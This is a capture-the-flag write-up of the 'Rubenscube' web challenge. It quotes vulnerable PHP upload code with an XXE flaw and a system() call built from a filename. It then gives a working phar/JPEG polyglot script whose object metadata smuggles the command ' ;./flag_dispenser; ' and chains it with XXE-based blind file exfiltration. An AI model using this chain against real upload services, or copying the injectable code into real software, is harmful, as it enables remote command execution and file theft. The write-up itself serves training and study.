# Rubenscube 

**Category**: Web

424 Points

26 Solves

**Problem description**:
Sharing is caring. For picture wizard use only. 

---

This was also a pretty good problem. Visiting the challenge site, we are prompted with a upload form to upload pictures.

In the robots.txt

```
User-agent: *
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self
Disallow: source.zip
```

The source.zip gives all the source. We only care about upload.php. Here is the relevant code

```php
<?php
session_start();

function calcImageSize($file, $mime_type) {
    if ($mime_type == "image/png"||$mime_type == "image/jpeg") {
        $stats = getimagesize($file);  // Doesn't work for svg...
        $width = $stats[0];
        $height = $stats[1];
    } else {
        $xmlfile = file_get_contents($file);
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $svg = simplexml_import_dom($dom);
        $attrs = $svg->attributes();
        $width = (int) $attrs->width;
        $height = (int) $attrs->height;
    }
    return [$width, $height];
}


class Image {

    function __construct($tmp_name)
    {
        $allowed_formats = [
            "image/png" => "png",
            "image/jpeg" => "jpg",
            "image/svg+xml" => "svg"
        ];
        $this->tmp_name = $tmp_name;
        $this->mime_type = mime_content_type($tmp_name);

        if (!array_key_exists($this->mime_type, $allowed_formats)) {
            // I'd rather 500 with pride than 200 without security
            die("Invalid Image Format!");
        }

        $size = calcImageSize($tmp_name, $this->mime_type);
        if ($size[0] * $size[1] > 1337 * 1337) {
            die("Image too big!");
        }

        $this->extension = "." . $allowed_formats[$this->mime_type];
        $this->file_name = sha1(random_bytes(20));
        $this->folder = $file_path = "images/" . session_id() . "/";
    }

    function create_thumb() {
        $file_path = $this->folder . $this->file_name . $this->extension;
        $thumb_path = $this->folder . $this->file_name . "_thumb.jpg";
        system('convert ' . $file_path . " -resize 200x200! " . $thumb_path);
    }

    function __destruct()
    {
        if (!file_exists($this->folder)){
            mkdir($this->folder);
        }
        $file_dst = $this->folder . $this->file_name . $this->extension;
        move_uploaded_file($this->tmp_name, $file_dst);
        $this->create_thumb();
    }
}
new Image($_FILES['image']['tmp_name']);
header('Location: index.php');
```

So there's an obvious XXE when it tries to load SVG files, and the __construct and __destruct methods point to somewhat deserialization. 

I quickly hosted a dtd on my domain to help with blind exfiltration of files and soon enough I was able to read file by using the `php://` uri with their base64 encode filter...

At this point, I knew I have to use the phar:// uri in the XXE to make php deserialize my object (of the type Image) with a controlled filename, and when __destruct would be called, it would lead to a command execution in the create_thumb funtion

I used [this](https://www.nc-lp.com/blog/disguise-phar-packages-as-images) to create a valid phar file disguised as a jpeg image, uploaded it and then used the XXE to to call it with phar:// uri. 

```php
$jpeg_header_size = 
"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";

$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test', 'text');
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");

$object = new Image('hack.png');
$object->file_name = " ;./flag_dispenser; ";
$phar->setMetadata($object);
$phar->stopBuffering();
```

This gave me command execution and then we had to execute the `flag_dispenser` to get the flag.
